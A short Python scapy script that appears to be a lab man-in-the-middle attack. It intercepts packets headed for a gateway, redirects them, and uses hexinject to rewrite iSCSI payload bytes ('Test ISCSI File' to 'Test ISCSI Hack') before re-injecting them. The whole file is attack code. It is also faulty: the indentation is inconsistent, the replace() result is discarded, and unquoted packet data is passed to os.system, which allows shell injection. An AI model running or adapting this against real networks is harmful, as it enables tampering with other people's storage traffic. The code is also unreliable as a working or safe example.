#!/etc/usr/python

from scapy.all import *
import sys

iface = "eth0"
filter = "ip"
#victim in this case is the initiator
VICTIM_IP = "192.168.1.179"
MY_IP = "192.168.1.143"
# gateway is the target
GATEWAY_IP = "192.168.1.178"
#VICTIM_MAC = "### don't want so show###"
MY_MAC = "08:00:27:f2:ee:7c"
#target mac address
GATEWAY_MAC = "08:00:27:24:08:34"

def handle_packet(packet):
    if (packet[IP].dst == GATEWAY_IP) and (packet[Ether].dst == MY_MAC):
     	# we change the packet destination to the target machine
     	packet[Ether].dst = GATEWAY_MAC
        # TODO: block iscsi packets with an if condition
        if(packet[TCP]):
           	# shows what the packet contains
        	#packet.show()
		packet_read = os.popen('hexinject -s -i eth0 -c 1 -f tcp').read()
		if ('54 65 73 74 20 49 53 43 53 49 20 46 69 6c 65' in packet_read):
			packet_read.replace("54 65 73 74 20 49 53 43 53 49 20 46 69 6c 65", "54 65 73 74 20 49 53 43 53 49 20 48 61 63 6b")
			#packet_file = open('packet', 'w')
			#packet_file.write(packet_read)
			os.system('echo ' + packet_read + ' | hexinject -p -i eth0')
		
           # TODO: create condition to check/filter the 'dport' packet tcp argument for 'iscsi_target'
     sendp(packet)
     print "A packet from " + packet[IP].src + " redirected!"

sniff(prn=handle_packet, filter=filter, iface=iface, store=0)


